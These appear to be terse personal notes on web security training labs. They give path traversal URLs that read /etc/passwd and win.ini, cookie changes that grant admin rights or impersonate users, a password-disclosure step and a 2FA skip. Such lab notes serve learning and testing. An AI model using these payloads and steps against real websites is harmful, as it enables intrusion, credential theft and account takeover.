## Reading arbitrary files via path traversal

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`  
`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`

## Lab: File path traversal, simple case
`/image?filename=../../../etc/passwd`

## Lab: Unprotected admin functionality
`/robots.txt`

## Lab: Unprotected admin functionality with unpredictable URL
Admin URL in `<script>` tag.

## Lab: User role controlled by request parameter
Change Cookie: `Admin=true`

## Lab: User ID controlled by request parameter, with unpredictable user IDs

1. Find a post of Carlos;
2. Find Carlos' UID in html;
3. Change id cookie to Carlos' UID


## Lab: User ID controlled by request parameter with password disclosure
1. Login in Wiener's account;
2. Open MyAccount page with cookie `id=administrator`;
3. Get administrator's password;
4. Delete Carlos.

## Lab: Username enumeration via different responses
Intrude. (wihout Pro filter is really shxxxxt.)


## Lab: 2FA simple bypass
Login with password, just skip the 2FA page (change URL).